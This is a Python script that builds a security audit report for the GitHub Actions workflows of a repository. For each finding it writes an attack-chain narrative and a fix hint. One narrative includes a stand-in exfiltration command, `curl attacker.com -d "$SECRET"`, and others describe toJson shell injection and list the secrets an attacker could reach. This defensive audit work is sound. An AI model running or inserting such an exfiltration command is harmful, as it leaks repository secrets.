#!/usr/bin/env python3
"""Assemble the final workflow-security-audit report."""
import json
import os
import re
from collections import Counter

TODAY = os.environ.get('TODAY', '2026-09-06')
REPO_NAME = os.environ.get('REPO_NAME', 'swarm-ai-research/aeon')
REPO_URL = os.environ.get('REPO_URL', 'https://github.com/swarm-ai-research/aeon')

findings = json.load(open('.audit/findings.json'))

# All NEW (no prior report exists)
for f in findings:
    f['delta'] = 'NEW'
    f['status'] = 'Manual required'

wf_count = len([f for f in os.listdir('.github/workflows') if f.endswith(('.yml','.yaml'))])
act_count = 0
if os.path.isdir('.github/actions'):
    for root, dirs, files in os.walk('.github/actions'):
        for f in files:
            if f in ('action.yml', 'action.yaml'):
                act_count += 1

sev_count = Counter(f['severity'] for f in findings)
total = len(findings)
crit = sev_count.get('Critical', 0)
high = sev_count.get('High', 0)
med = sev_count.get('Medium', 0)
low = sev_count.get('Low', 0)

new_count = sum(1 for f in findings if f['delta'] == 'NEW')
reintro = 0
unchanged = 0
resolved = 0
fixed = 0
manual = sum(1 for f in findings if f['severity'] in ('Critical', 'High'))

exit_mode = 'NEW_CRITICAL'
verdict = f'WORKFLOW_AUDIT_NEW_CRITICAL — {crit} new critical finding(s), {high} new high, {med} new medium, {low} new low; first on-disk audit for {REPO_NAME}'

# Group finding attack-chain narratives by rule
def snippet_at(file, line, ctx=0):
    try:
        lines = open(file).read().split('\n')
        if 0 < line <= len(lines):
            return lines[line-1].strip()
    except Exception:
        pass
    return ''

def attack_chain(f):
    """Return a 5-line attack chain dict for a finding."""
    file = f['file']
    line = f['line']
    rule = f['rule_id']
    is_dispatchable = False
    try:
        text = open(file).read()
        if 'workflow_dispatch' in text or 'repository_dispatch' in text or 'issues:' in text or 'issue_comment' in text or 'pull_request_target' in text:
            is_dispatchable = True
    except Exception:
        pass

    if rule == 'zizmor/unpinned-uses':
        return {
            'entry': f'`workflow_dispatch` on any collaborator + `issues.opened` from any authenticated user (`aeon.yml`)',
            'vector': f'{snippet_at(file, line)} — tag ref (e.g. `@v4`, `@v5`) is a moving target; can be repointed by the action author or a supply-chain compromise',
            'sink': 'GitHub Actions runner executes the action with the job\'s token + secrets scope',
            'secrets': '`GITHUB_TOKEN` (contents/actions write on this workflow), `GH_GLOBAL` in later steps',
            'blast': 'Full repo write, workflow dispatch, ability to overwrite `.github/workflows/*.yml`, exfiltrate every reachable secret across the fleet',
        }
    if rule == 'zizmor/ref-version-mismatch':
        return {
            'entry': f'`{"dispatchable" if is_dispatchable else "scheduled/tag-triggered"}` workflow',
            'vector': f'{snippet_at(file, line)} — SHA is pinned, but the accompanying `# vN` comment does not match the commit, so a reviewer trusting the comment may miss that the intended version drifted',
            'sink': 'Runner executes the pinned commit regardless of the comment; risk is reviewer/audit confusion, not immediate RCE',
            'secrets': 'Depends on job env — see file',
            'blast': 'Low direct exploit risk; audit-hygiene finding. Real risk is that future edits trust the comment and revert to a bad SHA.',
        }
    if rule == 'zizmor/secrets-outside-env':
        return {
            'entry': ('`workflow_dispatch` + `repository_dispatch` (external triggerable via `gh api repos/.../dispatches`)' if is_dispatchable else 'Scheduled cron / push-triggered'),
            'vector': f'{snippet_at(file, line)} — secret accessed at job/step scope without a GitHub Environment gate; anyone who can push a workflow edit (PR from any collaborator on a fork-less repo, or a merged malicious PR) can exfiltrate',
            'sink': 'Secret gets injected as env var / with-input; if step body is later modified to `curl attacker.com -d "$SECRET"`, exfil is silent',
            'secrets': f'{snippet_at(file, line)[:120]}',
            'blast': 'Full compromise of the named secret. Fleet-wide secrets (`ANTHROPIC_API_KEY`, `TELEGRAM_BOT_TOKEN`, `GH_GLOBAL`) also let attackers post from the bot identities and consume paid quotas.',
        }
    if rule == 'handrolled/tojson-shell-injection':
        return {
            'entry': '`repository_dispatch` (payload from any GitHub App or PAT with dispatch permission)',
            'vector': f'{snippet_at(file, line)} — `toJson(...)` result substituted into a `run:` shell inside single quotes; attacker JSON with an escaped single-quote breaks quoting',
            'sink': 'Bash command substitution runs the injected payload with the job\'s environment',
            'secrets': 'Every secret in the tick/messages job',
            'blast': 'RCE on the runner with fleet-wide secret access.',
        }
    return None

def render_finding(f, is_new=True):
    tag = f'[{f["severity"].upper()}]'
    delta_tag = f['delta']
    header = f'### {tag} `{f["rule_id"]}` — {f.get("message","")[:120]}'
    ac = attack_chain(f)
    out = [header]
    out.append(f'**File:** `{f["file"]}` · **Line:** {f["line"]} · **Delta:** {delta_tag}')
    if f.get('snippet'):
        out.append('**Pattern:**')
        out.append('```yaml')
        out.append(f['snippet'])
        out.append('```')
    if ac:
        out.append('**Attack chain:**')
        out.append(f'1. **Entry:** {ac["entry"]}')
        out.append(f'2. **Vector:** {ac["vector"]}')
        out.append(f'3. **Sink:** {ac["sink"]}')
        out.append(f'4. **Reachable secrets:** {ac["secrets"]}')
        out.append(f'5. **Blast radius:** {ac["blast"]}')
    # Fix hint
    if f['rule_id'] == 'zizmor/unpinned-uses':
        out.append('**Fix (manual):** replace `@vN` with the commit SHA of the intended release + `# vN.N.N` comment. Example:\n```yaml\n# BEFORE\nuses: actions/checkout@v4.4.0\n# AFTER\nuses: actions/checkout@85e6279cec87321a52edac9c87bce653a07cf6c2 # v4.4.0\n```')
    elif f['rule_id'] == 'zizmor/ref-version-mismatch':
        out.append('**Fix (manual):** update the `# vN` comment to match the commit metadata at the pinned SHA (run `gh api repos/OWNER/REPO/commits/SHA -q .commit.message` and use the tagged version).')
    elif f['rule_id'] == 'zizmor/secrets-outside-env':
        out.append('**Fix (manual):** create a GitHub Environment (`production` or `chain-runner`), move the secret into it, and add `environment:` to the job. Requires operator action in repo settings — no code-only fix.')
    out.append(f'**Status:** {f["status"]}')
    out.append('')
    return '\n'.join(out)

# --- Build output ---
lines = []
lines.append(f'# Workflow Security Audit — {TODAY}')
lines.append('')
lines.append(f'**Verdict:** {verdict}')
lines.append(f'**Repo:** [{REPO_NAME}]({REPO_URL})')
lines.append(f'**Files audited:** {wf_count + act_count} ({wf_count} workflows, {act_count} composite actions)')
lines.append(f'**Findings this run:** {total} ({crit} critical, {high} high, {med} medium, {low} low)')
lines.append(f'**Delta vs (no prior audit):** {new_count} new, {reintro} reintroduced, {unchanged} unchanged, {resolved} resolved')
lines.append(f'**Auto-fixed:** {fixed}')
lines.append('')
lines.append('_This is the first machine-readable delta baseline landing on disk. Prior audits ran but their reports were never written to `articles/` (see MEMORY.md "articles/ dir never existed in git")._')
lines.append('')

# Regressions section (none this run)
lines.append('## Regressions (previously-fixed findings now present again)')
lines.append('')
lines.append('_None — no prior report to diff against._')
lines.append('')

# NEW Critical section
lines.append('## New Critical findings')
lines.append('')
crit_findings = [f for f in findings if f['severity'] == 'Critical']
if not crit_findings:
    lines.append('_None._')
    lines.append('')
for f in crit_findings:
    lines.append(render_finding(f))
    lines.append('---')
    lines.append('')

# NEW High section
lines.append('## New High findings')
lines.append('')
high_findings = [f for f in findings if f['severity'] == 'High']
# Group by rule to keep the section digestible; show first ~3 per rule as full narratives
by_rule = {}
for f in high_findings:
    by_rule.setdefault(f['rule_id'], []).append(f)
for rule, items in by_rule.items():
    lines.append(f'### {rule} — {len(items)} finding(s)')
    lines.append('')
    for f in items[:2]:  # first 2 get full narrative
        lines.append(render_finding(f))
    if len(items) > 2:
        lines.append(f'**Additional {len(items)-2} finding(s) of `{rule}` (compact):**')
        lines.append('')
        lines.append('| File | Line | Snippet |')
        lines.append('|------|-----:|---------|')
        for f in items[2:]:
            snip = (f.get('snippet','') or f.get('message','')).replace('|', '\\|')[:100]
            lines.append(f'| `{f["file"]}` | {f["line"]} | `{snip}` |')
        lines.append('')
    lines.append('---')
    lines.append('')

# Medium/Low compact tables
lines.append('## New Medium findings (compact)')
lines.append('')
med_findings = [f for f in findings if f['severity'] == 'Medium']
if med_findings:
    lines.append('| Rule | File | Line | Message |')
    lines.append('|------|------|-----:|---------|')
    for f in med_findings:
        msg = f.get('message', '').replace('|', '\\|')[:100]
        lines.append(f'| `{f["rule_id"]}` | `{f["file"]}` | {f["line"]} | {msg} |')
else:
    lines.append('_None._')
lines.append('')

lines.append('## New Low findings (compact)')
lines.append('')
low_findings = [f for f in findings if f['severity'] == 'Low']
if low_findings:
    lines.append('| Rule | File | Line | Message |')
    lines.append('|------|------|-----:|---------|')
    for f in low_findings:
        msg = f.get('message', '').replace('|', '\\|')[:100]
        lines.append(f'| `{f["rule_id"]}` | `{f["file"]}` | {f["line"]} | {msg} |')
else:
    lines.append('_None._')
lines.append('')

# Carried-over + resolved (empty this run)
lines.append('## Carried over (unchanged)')
lines.append('')
lines.append('_None — no prior report._')
lines.append('')
lines.append('## Resolved since prior audit')
lines.append('')
lines.append('_None — no prior report. Note: the historical `toJson(github.event.client_payload.message)` shell-injection pattern (April 11 miss, referenced in SKILL.md step 2) is verified fixed at `.github/workflows/messages.yml:667` via `_CLIENT_PAYLOAD_MESSAGE` env intermediary — recorded here for future delta baselines._')
lines.append('')

lines.append('## Source status')
lines.append('')
lines.append(f'- zizmor: ok ({len([f for f in findings if f["source"]=="zizmor"])} findings)')
lines.append(f'- actionlint: ok ({len([f for f in findings if f["source"]=="actionlint"])} findings)')
lines.append(f'- hand-rolled: ok ({len([f for f in findings if f["source"]=="hand-rolled"])} findings — toJson shell-injection pattern already fixed at messages.yml:667)')
lines.append('')

# Fingerprint trailer (machine-readable)
lines.append('<!--')
lines.append('workflow-security-audit-fingerprints')
for f in findings:
    # step field may be empty
    step_or_line = (f.get('step') or f"L{f['line']}").replace(' ', '_')
    lines.append(f'{f["fingerprint"]} severity={f["severity"]} status=manual rule={f["rule_id"]} file={f["file"]} step={step_or_line}')
lines.append('-->')
lines.append('')

open(f'articles/workflow-security-audit-{TODAY}.md', 'w').write('\n'.join(lines))
print(f'Wrote articles/workflow-security-audit-{TODAY}.md ({len(lines)} lines, {sum(len(x) for x in lines)} bytes)')
print(f'Verdict: {verdict}')
print(f'Exit mode: {exit_mode}')
print(f'Findings: total={total} crit={crit} high={high} med={med} low={low}')
print(f'Auto-fixed: {fixed}, Manual: {manual}')
